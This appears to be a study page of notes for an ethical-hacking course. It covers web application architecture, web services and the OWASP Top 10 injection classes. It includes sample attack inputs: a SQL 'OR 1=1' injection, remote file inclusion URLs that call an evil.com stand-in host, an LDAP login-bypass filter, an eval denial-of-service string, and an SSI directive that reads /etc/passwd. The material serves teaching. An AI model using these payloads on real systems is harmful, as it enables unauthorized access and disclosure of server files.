 <meta name=”robots” content=”noindex,nofollow”/>
  <a href=index.html>Back to home</a>
<hr/>
<h1>Hacking web applications</h1>
<p>Everyone connected via the internet is using various web applications for different purposes, including oneline shopping, email, chats and social networking.</p>
<p>Web applications are becoming increasingly vulnerable to more sophisticated threats and attack vectors.</p>
<h2>Web Application Concepts</h2>
<p>Web applications are software programs that run on web browsers and act as the interface between users and web servers through web pages. They enable users to request, submit, and 
retrieve data to/from a database over the internet by interacting with a GUI. Based on browser-supported programming languages such as JavaScript, HTML and CSS, web applications work in 
combination with other programming languages such as SQL to access data from the databases. Web applications are developed as dynamic web pages, and they allow users to communicate with 
servers using server-side scripts. They allow users to perform specific tasks such as searching, sending emails, connecting with friends, online shopping, tracking and tracing. </p>
<p>Whenever users need to access services, they can request them by submitting the Uniform Resource Identifier (URI) or Uniform Resource Locator (URL) of the web application in a browser.</p>
<p>Web applications offer a multitude of features, are secure and relatively easy to develop. They offer better services than many computer-based software applications and are easy to install, 
maintain and update. </p>
<p><ol>
 <ul>Independent of operating system, development and maintenance is easy and cost-effective</ul>
 <ul>accessible anytime and anywhere using only a computer with internet connection</ul>
 <ul>user interface is customizable and easy to update</ul>
 <ul>users can access them on any internet connected device</ul>
 <ul>dedicated, monitored and managed by experienced server administrators store all web application data, developers can increase workload capacity</ul>
 <ul>multiple locations of servers increase physical security and reduce the burden of monitoring thousands of desktops using the program</ul>
 <ul>flexible core technologies like JSP, Servlets, ASP, SQL server, .NET and scripting languages</ul>
</ol></p>
<p>Web applications are vulnerable to various attacks such as SQL injection, XSS and session hijacking.</p>
<h2>How do web applications work</h2>
<p>Main function is to fetch user-requested data from a database. </p>
<p><ol>
 <ul>The user enters the website name or URL in the browser and the request is sent to the web server</ul>
 <ul>The web server checks the file extension</ul>
 <ul>If the file extension is HTM(L) the web server processes the request and sends the file to the user's browser</ul>
 <ul>If the file extension is from a file that needs to be processed at server side (php, asp, cfm etc.) the web application server processes the request</ul>
 <ul>The web server passes the request to the web application server</ul>
 <ul>The web application server accesses the database to perform the requested task</ul>
 <ul>After processing the request, the web application server sends the results to the web server, which in turn sends it to the user's browser</ul>
</ol></p>
<h2>Web Application Architecture</h2>
<p>Web applications run on web browsers and use a set of <b>server-side scripts</b> (Java, C#, Ruby, PHP etc.) and <b>client-side scripts</b> (HTML, JavaScript etc.)</p>
<p>There are three layers:</p>
<p><ol>
 <ul>Client layer (presentation layer)</ul>
 <ul>Business logic layer</ul>
 <ul>Database layer</ul>
</ol></p>
<p>The <b>client</b> or <b>presentation layer</b> includes all physical devices present on the client side (laptops, smartphones, tablets, computers etc.). All these devices have operating systems and 
compatible browsers, which enable users to send requests for required web applications.</p>
<p>The <b>Business logic layer</b> consists of two layers: web-server logic layer and business logic layer. The web-server logic layer contains various components such as firewall, an HTTP request parser, 
a proxy caching server, an authentication and login handler, a resource handler and a hardware component (server). The <b>Business logic layer</b> includes the functional logic of the web application, 
which is implemented using technologies such as .NET, Java and middleware. It defines the flow of data, according to which the developer builds the application using programming languages. </p>
<p>The database layer consists of cloud services, a B2B layer that holds all the commercial transaction and a database server that supplies an organization's production data in a structured form (MS SQL Server, 
MySQL server etc.)</p>
<h1>Web Services</h1>
<p>A web service is an application or software that is deployed over the internet. It uses a standard message protocol such as SOAP to enable communication between applications developed on different 
platforms. For instance, Java-based services can interact with PHP applications. These web-based applications are integrated with SOAP, UDDI, WSDL and REST across the network. </p>
<h2>Web Service Architecture</h2>
<p>Three roles:</p>
<p><ol>
 <ul>Service Provider -> platform from where services are provided</ul>
 <ul>Service Requester -> application or client that is seeking a service or trying to establish communication with a server; in general the web browser is the requester and invokes the service on behalf of the user</ul>
 <ul>Service Registry -> place where the provider loads service descriptions; the requester discovers the service and retrieves binding data from the service descriptions</ul>
</ol></p>
<p>Three operations:</p>
<p><ol>
 <ul>Publish -> service descriptions are published to allow the requester discover services</ul>
 <ul>Find -> the requester tries to obtain the service descriptions</ul>
 <ul>Bind -> the requester calls and establishes communication with the service during run time</ul>
</ol></p>
<h2>Two artifacts:</h2>
<p><ol>
 <ul>Service -> software module offered by the service provider over the internet</ul>
 <ul>Service Description -> interface details and service implementation details; can be stored in registry and invoked by requester</ul>
</ol></p>
<h2>Web Services Characteristics</h2>
<p><ol>
 <ul>XML - based (more recent: JSON based)</ul>
 <ul>Coarse-grained service -> sometimes containing massive amounts of information is offered; a coarse-grained service is a combination of multiple fine-grained services</ul>
 <ul>Loosely coupled -> loosely coupled approach for interconnecting systems; interaction between systems can occur via web API by sending XML (JSON) messages</ul>
 <ul>Asynchronous and synchronous support -> synchronous services are called by users who wait for a response whereas asynchronous services are called by users who do not wait for a response; RPC based messages and document - 
 based messages are often used for synchronous and asynchronous web services; synchronous and asynchronous endpoints are implemented using servlets, SOAP/XML and HTTP</ul>
 <ul>RPC support -> web services support remote procedures calls (RPC) similar to traditional applications</ul>
</ol></p>
<h2>Types of web services</h2>
<p><ol>
 <ul>SOAP web services -> Simple Object Access Protocol, defines XML format; XML is used to transfer data between service provider and requester</ul>
 <ul>RESTful web services -> REpresentational State Transfer web services are designed to make the services more productive; using underlying HTTP concepts to define the services; more an architectural approach rather than 
 a protocol like SOAP</ul> 
</ol></p>
 <h2>Components of Web Service Architecture</h2>
<p><ol>
 <ul>UDDI -> Universal Description, Discovery and Integration; directory service that lists all the services available</ul>
 <ul>WSDL -> Web Services Description Language; XML based language that describes and traces web services</ul>
 <ul>WS-Security -> Web Services Security; plays important role in securing web services; extension of SOAP and aims to maintain the integrity and confidentiality of SOAP messages as well as to authenticate users</ul>
</ol></p>
<h1>Vulnerability Stack</h1>
<p><ol>
 <ul>Layer 7 -> Custom Web Applicatons -> business logic flaws / technical vulnerabilities</ul>
 <ul>Layer 6 -> Third-party components -> open source / commercial</ul>
 <ul>Layer 5 -> Web Server -> Apache / Nginx / IIS</ul>
 <ul>Layer 4 -> Database -> Oracls / MySQL / MS SQL</ul>
 <ul>Layer 3 -> Operating System -> Windows / Linux / MacOS</ul>
 <ul>Layer 2 -> Network -> Router / switch</ul>
 <ul>Layer 1 -> Security -> IPS / IDS</ul>
</ol></p>
<p>Attackers exploit the vulnerabilities of one or more elements among the seven levels to gain unrestricted access to an application or the entire network.</p>
<p><ol>
 <ul>Layer 7 -> performing input validation attacks such as XSS</ul>
 <ul>Layer 6 -> third-party components integrate with the website to achieve certain functionality (example: payment gateway of bank on a webshop); attackers exploit redirections</ul>
 <ul>Layer 5 -> attackers exploit web servers by searching for known vulnerabilities</ul>
 <ul>Layer 4 -> attackers exploit database using tools like sqlmap</ul>
 <ul>Layer 3 -> attackers scan operating systems for open ports and vulnerabilities and develop malware / backdoors to exploit them</ul>
 <ul>Layer 2 -> attackers flood switches to exhaust CAM tables and focus on sniffing data</ul>
 <ul>Layer 1 -> attackers adopt evasion techniques to circumvent IDS / IPS </ul>
</ol></p>
<h1>Web Application Threats</h1>
<p>According to <a target=_blank href=https://owasp.org>OWASP</a> the latest top 10 security risks are: </p>
<p><ol>
 <ul>A01 - Broken Access Control </ul>
 <ul>A02 - Cryptographic Failures</ul>
 <ul>A03 - Injection</ul>
 <ul>A04 - Insecure Design</ul>
 <ul>A05 - Security Misconfiguration</ul>
 <ul>A06 - Vulnerable and Outdated Components</ul>
 <ul>A07 - Identification and Authentication Failures</ul>
 <ul>A08 - Software and Data Integrity Failures</ul>
 <ul>A09 - Security Logging and Monitoring Failures</ul>
 <ul>A10 - Server-Side Request Forgery (SSRF)</ul>
</ol></p>
<h2>A01 - Broken Access Control</h2>
<p>Access control refers to how a web application grants access to create, update and delete any record / content or function to some privileged users while restricting access to other users. Broken access control 
is a method by which an attacker identifies a flaw related to access control, bypasses the authentication and compromises the network. Access control weaknesses are common because of the lack of automated detection 
and effective functional testing by application developers; They allow attackers to act as users or administrators with privileged functions and create, access, update or delete any record. </p>
<p><ol>
 <ul>Abusing least privileges or denying it by default -> everyone gains access to the roles, users or abilities</ul>
 <ul>Evading filtering of access controls by changing URL, API request, HTML page or application state via parameter tampering, force browsing or any attack tool</ul>
 <ul>Gaining permission to read or modify someone's account through their unique identifier</ul>
 <ul>Gaining access to the APIs without access controls for PUT, POST and DELETE</ul>
 <ul>Escalating privileges, where a user can act as an administrator after logging in</ul>
</ol></p>
<h2>A02 - Cryptographic Failures / Sensitive Data Exposure</h2>
<p>If users do not maintin proper security of their storage locations, the application may be at risk as attackers can access the storage and misuse the information. Some cryptographic encryption methods have 
inherent weaknesses that allow attackers to exploit and steal data. Developers can avoid attacks using algorithms to encrypt sensitive data. At the same time, cryptograpic keys have to be stored securely.</p>
<h2>A03 - Injection Flaws</h2>
<p>Web application vulnerabilities that allow untrusted data to be interpreted and executed as part of a command or query. </p>
<p><ol>
 <ul>SQL Injection -> non-validated input vulnerabilities to pass SQL commands through a web application for execution by a backend database</ul>
 <ul>Command Injection -> injecting malicious command in application</ul>
 <ul>LDAP Injection -> attack method in which websites that construct LDAP statements from user-supplied input are exploited</ul>
 <ul>Cross-Site Scripting (XSS) -> XSS allows attackers to inject and execute scripts in the victim's browser, which can hijack user sessions, deface websites or redirect the user to malicious sites</ul>
</ol></p>
<h2>SQL Injection</h2>
<p>SLQ Injection attacks use a series of malicious SQL queries or SQL statements to directly manipulate the database. SQL Injection attacks work because the application does not properly validate the input 
before passing it to an SQL statement.</p>
<p><ol>
 <ul>SELECT * FROM tablename WHERE UserID = 2302 (normal)</ul>
 <ul>SELECT * FROM tablename WHERE UserID = 2302 OR 1=1 (simple SQL injection attack)</ul>
</ol></p>
<p>The expression "OR 1=1" evaluates to the value "TRUE", often allowing the enumeration of all User ID values from the database. Attackers carry out SQL injection attacks from the web browsers's address bar, 
form fields, queries, searches and so on. It allows:</p>
<p><ol>
 <ul>Log into the application without supplying valid credentials</ul>
 <ul>Perform queries against data in the database, often even data to which the application would not normally have access</ul>
 <ul>Modify database contents or drop the database altogether</ul>
 <ul>Use the trust relationships established between the web application components to access other databases</ul>
</ol></p>
<h2>Command Injection Attacks</h2>
<p>Command Injection flaws allow attackers to pass malicious code to different systems via web applications. The attacks include calls to an operating system over system calls, use of external programs over 
shell commands and calls to backend databases over SQL. Scripts in Perl, Python and other languages execute and insert poorly designed web applications. If a web application uses any type of interpreter, 
attackers insert malicious code to inflict damage.</p>
<p>A frequently used program is <b>sendmail</b>. Carefully scrub an application before passing a piece of information through an HTTP external request. Otherwise, attackers can insert special characters, 
malicious commands and command modifiers into the information. The web application then blindly passes these characters to the external system for execution. Inserting SQL commands is a dangerous practice 
and rather widespread, as it is a command injection method. </p>
<p><ol>
 <ul>Shell Injection -> include system(), StartProcess(), java.lang.Runtime.exec(), System.Diagnostics.Process.Start() and similar APIs</ul>
 <ul>HTML Embedding -> extra HTML - based content is added; script is placed into output HTML</ul>
 <ul>File Injection -> http://www.certifiedhacker.com/vulnerable.php?COLOR=http://evil/exploit?</ul>
</ol></p>
<p>Example: an attacker enters the following malicious code (account number) with a new password:</p>
<p>www.certifiedhacker.com/banner.gif||newpassword||1036|60|468</p>
<p>The last two sets of numbers denote the banner size. Once the attacker clicks the submit button, the password for the account 1036 is changed to 'newpassword'. The server script assumes that only the 
URL of the banner image file is inserted into that field.</p>
<h2>File Injection Attack</h2>
<p>A file injection attack is a technique used to exploit "dynamic file include" mechanisms in web applications. File injection attacks enable attackers to exploit vulnerable scripts on the server to use 
a remote file instead of a presumably trusted file from the local file system. Most web application frameworks support file inclusion. An attacker enters a URL that redirects the application to the location 
of the malicious file. PHP is particularly vulnerable to these attacks because of the extensive use of "file includes" in PHP programming and default server configurations. </p>
<p>If the application ends with a php extension, and if a user requests it, then the application interprets it as a PHP script and executes it. This allows an attacker to perform arbitrary commands:</p>
<p>http://www.certifiedhacker.com/orders.php?DRINK=http://evil.com/exploit?</p>

<h2>LDAP Injection Attacks</h2>
<p>LDAP Directory Services store and organize information based on <b>attributes</b>. The information is hierarchically organized as a tree of directory entries. The <b>Lightweight Directory Access Protocol</b>
is based on the client-server model, and clients can search the directory entries using filters.</p>
<p>An LDAP injection attack works in the same way as an SQL injection attack, but it exploits user parameters to generate an LDAP query. It runs on an Internet transport protocol such as TCP, and it is an 
open-standard protocol for manipulating and querying Directory Services. An LDAP injection technique is used to take advantage of non-validated web application input vulnerabilities to pass LDAP filters used 
for searching Directory Services to obtain direct access to databases behind an LDAP tree.</p>
<p><ol>
 <ul>Login bypass</ul>
 <ul>Information disclosure</ul>
 <ul>Privilege escalation</ul>
 <ul>Information alteration</ul>
</ol></p>
<p>To test if an application is vulnerable to LDAP code injection, send a query to the server that generates an invalid input. If the LDAP server returns an error, it can be exploited with code injection 
techniques. If an attacker enters a valid username "certifiedhacker" and injects <b>certifiedhacker)(&))</b> then the URL string becomes <b>(&(USER=certifiedhacker)(&)(PASS=blah))</b>. The LDAP server
processes only the first filter; only the query <b>(&(USER=certifiedhacker)(&))</b> is processed. This query is always TRUE and the attacker logs into the system without a valid password.</p>
<p>An important defense method against such attacks is to filter all inputs to the LDAP; otherwise vulnerabilities in LDAP allow the execution of unauthorized queries or modifications of its content. 
When the attacker modifies the LDAP statements, the process runs with the same permissions as the component of the web application that executed the command.</p>

<h2>Server-Side JS Injection</h2>
<p>Server-side JavaScript injections are vulnerabilities that manifest when an application integrates user-controllable values into a string that the code interpreter dynamically validates. Attackers 
exploit improper validation of user data and pass random values to alter the code that will be compiled and executed by the server.</p>
<p>Attackers can launch a DoS attack by passing commands to the eval() function: <b>While (1)</b></p>
<p>The command forces the server's event loop to use the complete processor time and restricts it from evaluating additional inputs until the process is reinitiated.</p>

<h2>Server-Side Includes Injection</h2>
<p>Server-side includes is an application feature that helps designers to auto-generate the content of the web page without manual involvement. # directives allow developers to perform this activity. These 
directives can be files, CGI variables, shell commands etc. After evaluating all the directives, HTML is delivered to the requester.</p>
<p>Attackers launch server-side injection attacks to take control over web applications integrated with SSI directives -> <b><!_ #exec cmd="cat/etc/passwd" --></b></p>

<h2>Server-side Template Injection</h2>
<p>While creating dynamic pages, designers or developers use template engines to segregate programming logic from data presentation. Server-side template injection occurs when users are allowed to insert 
unsafe inputs into a server-side template. When this vulnerability exists, attackers can inject malicious template directives to run arbitrary code and gain complete control over the target web server. 
This injection is similar to XSS but is often employed to target server internals and achieve remote code execution, making every vulnerable application a primary target. Template injection manifests via 
designers' code errors and deliberate template disclosure while showcasing rich features of applications, blogs etc.</p>

<h2>Log Injection</h2>
<p>Attackers launch log injection attacks by exploiting unsanitized or unvalidated inputs to application logs. Applications usually store a large number of logs such as access logs, transaction logs, 
monitor logs, error logs etc. If an application or its administrator fails to log users' events or actions in a secure manner, attackers could insert fake entries or records to corrupt the log file. 
Attackers use this technique to insert misleading information in the log file for covering their tracks.</p>

<h2>HTML Injection</h2>
<p>HTML injection attack is initiated by injecting HTML code via vulnerable form inputs of a web page. It is different from JavaScript and VB script injection attacks. When the HTML code is injected, 
it allows the attacker to create a malicious form that appears to be genuine to the end users. It requests users to re-enter their credentials.</p>

<h2>CRLF Injection</h2>
<p>Carriage return line feed (CRLF) injection attack, attackers inject carriage return (\r) and line feed (\n) characters into the user's input to trick the web server, web application or user into 
believing that the current object is terminated and a new object has been initiated (HTTP request smuggling).</p>

<h2>JNDI Injection</h2>
<p>Java Naming and Directory Interface (JNDI) is a Java-based API that takes a single parameter as input and searches for the requested object based on the specified name.</p>

<h2>A04 - Insecure Design</h2>
<p>Insecure design flaws arise in an application because of the improper implementation of security controls</p>
<p><ol>
 <ul>Request forgery</ul>
 <ul>Authentication hijacking</ul>
 <ul>Identity theft</ul>
 <ul>Data loss</ul>
 <ul>DoS attacks</ul>
</ol></p>
<h2>A05 - Security Misconfigurations</h2>
<p>Unvalidated Inputs -> input from a client is not validated before being processed by web applications and backend servers.</p>
<p>Parameter / Form Tampering -> manipulation of parameters exchanged between client and server. This information is actually stored in cookies, hidden form fields or URL query strings. </p>
<p>Improper Error Handling -> insights in source code</p>
<p><ol>
 <ul>Null pointer exceptions</ul>
 <ul>System call failure</ul>
 <ul>Database unavailable</ul>
 <ul>Network timeout</ul>
 <ul>Database information</ul>
 <ul>Web application logical flow</ul>
 <ul>Application environment</ul>
</ol></p>
<h2>Insufficient Transport Layer Protection</h2>
<p>When an application fails to protect sensitive traffic flowing in a network. It supports weak algorithms and uses expired or invalid certificates. Developers should use SSL/TLS authentication 
for authentication on the websites; otherwise an attacker can monitor the network traffic.</p>
<h2>Improper Restriction of XML External Entity (XXE)</h2>
<p>Many older or poorly configured XML processors evaluate externel entity references within XML documents. External entities can disclose internal files using the file URI handler, internal SMB 
file shares on unpatched Windows servers, internal port scanning, remote code execution and DoS attacks such as the billion laughs attack.</p>
<p><ol>
 <ul>Missing security hardening</ul>
 <ul>Server software flaws</ul>
 <ul>Enabling unnecessary services</ul>
 <ul>Improper authentication</ul>
 <ul>Unpatched security flaws</ul>
 <ul>Server configuration problems</ul>
 <ul>Default accounts with default credentials</ul>
 <ul>Legacy software</ul>
</ol></p>
